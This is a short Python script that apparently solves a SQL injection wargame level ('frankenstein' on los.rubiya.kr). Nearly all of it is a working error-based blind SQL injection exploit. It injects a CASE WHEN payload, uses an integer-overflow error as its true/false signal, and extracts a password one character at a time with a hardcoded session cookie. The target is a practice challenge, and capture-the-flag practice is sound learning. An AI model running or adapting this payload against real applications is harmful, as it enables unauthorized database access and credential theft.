import requests
from string import digits, printable

session = requests.Session()
cookies = {"PHPSESSID": "t3ph90fkrspl4c71i1b8re936n"}
l=8
print("Length :", l)
url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw=' or case when id like 'a%25' and pw like '{}%25' or id like 'f%25' and pw like '%25' then 1 else ~0%2b1 end--+"
pw = ""
for j in range(l):
    for i in printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('error' not in r.text[-10:] and i not in "#+%&"):
            pw += i
            print("Password : {}".format(pw), end='\r')
            break
print("Password :", pw)
